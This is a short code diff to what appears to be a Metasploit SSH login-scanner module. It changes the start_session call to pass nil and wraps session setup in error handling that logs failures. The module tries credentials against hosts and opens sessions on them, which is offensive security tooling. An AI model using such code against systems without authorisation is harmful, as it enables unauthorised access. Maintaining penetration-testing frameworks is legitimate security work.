@@ -70,8 +70,7 @@ class MetasploitModule < Msf::Auxiliary
       'USERNAME'      => result.credential.public,
       'PASSWORD'      => result.credential.private
     }
-    info = "#{proto_from_fullname} #{result.credential} (#{ Rex::Socket.is_ipv6?(@ip) ? '[' + @ip + ']' : @ip }:#{rport})"
-    s = start_session(self, info, merge_me, false, sess.rstream, sess)
+    s = start_session(self, nil, merge_me, false, sess.rstream, sess)
     self.sockets.delete(scanner.ssh_socket.transport.socket)
 
     # Set the session platform
@@ -127,7 +126,16 @@ class MetasploitModule < Msf::Auxiliary
         credential_core = create_credential(credential_data)
         credential_data[:core] = credential_core
         create_credential_login(credential_data)
-        session_setup(result, scanner) if datastore['CreateSession']
+
+        if datastore['CreateSession']
+          begin
+            session_setup(result, scanner)
+          rescue StandardError => e
+            elog('Failed to setup the session', error: e)
+            print_brute :level => :error, :ip => ip, :msg => "Failed to setup the session - #{e.class} #{e.message}"
+          end
+        end
+
         if datastore['GatherProof'] && scanner.get_platform(result.proof) == 'unknown'
           msg = "While a session may have opened, it may be bugged.  If you experience issues with it, re-run this module with"
           msg << " 'set gatherproof false'.  Also consider submitting an issue at github.com/rapid7/metasploit-framework with"
